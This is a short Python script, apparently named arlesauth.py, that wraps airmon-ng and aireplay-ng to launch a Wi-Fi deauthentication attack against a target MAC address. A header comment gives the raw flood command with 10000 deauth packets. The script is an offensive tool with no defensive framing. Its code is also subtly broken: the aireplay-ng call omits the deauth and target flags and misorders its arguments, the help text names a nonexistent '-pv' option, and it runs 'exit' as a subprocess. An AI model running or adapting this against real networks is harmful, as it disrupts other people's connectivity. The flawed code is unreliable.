## aireplay-ng --deauth 10000 -a MACADRESS wlan0mon

import subprocess
import optparse


parse_object = optparse.OptionParser()
parse_object.add_option("-i" , "--interface" , dest="interface" , help="Example : python arlesauth.py -i eth0")
parse_object.add_option("-m" , "--mac", dest="mac_adress",help="Example : python arlesauth.ph -i wlan0 -m 00:22:52:64:85:88")
parse_object.add_option("-p", "--packetload", dest="packet_load" , help="Example : python arlesauth.py -i wlan0 -m 00:22:52:64:85:88 -pv 10000 ")
(user_inputs,arguments) = parse_object.parse_args()

user_interface = user_inputs.interface
user_mac_adress = user_inputs.mac_adress
user_packet_load = user_inputs.packet_load
print("package delivery started")


subprocess.call(["sudo", "airmon-ng", "start", user_interface])
subprocess.call(["aireplay-ng",user_interface,user_packet_load,user_mac_adress])
subprocess.call(["exit"])
subprocess.call(["sudo","airmon-ng","stop"])